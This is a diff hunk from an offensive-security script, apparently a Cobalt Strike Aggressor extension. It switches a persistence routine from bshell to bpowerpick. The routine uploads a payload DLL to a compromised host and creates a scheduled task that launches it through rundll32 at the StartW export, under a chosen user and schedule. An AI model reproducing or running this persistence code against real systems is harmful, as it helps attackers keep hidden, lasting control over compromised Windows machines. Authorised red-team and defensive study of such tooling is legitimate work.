@@ -14,8 +14,8 @@ sub persistUserSchtasks  {
 		else {
 			bcd($bid, $3['targetpath']);
 			bupload($bid, $3['payloadfile']);
-			bshell($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
-			bshell($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
+			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
 		}
 	}));
 
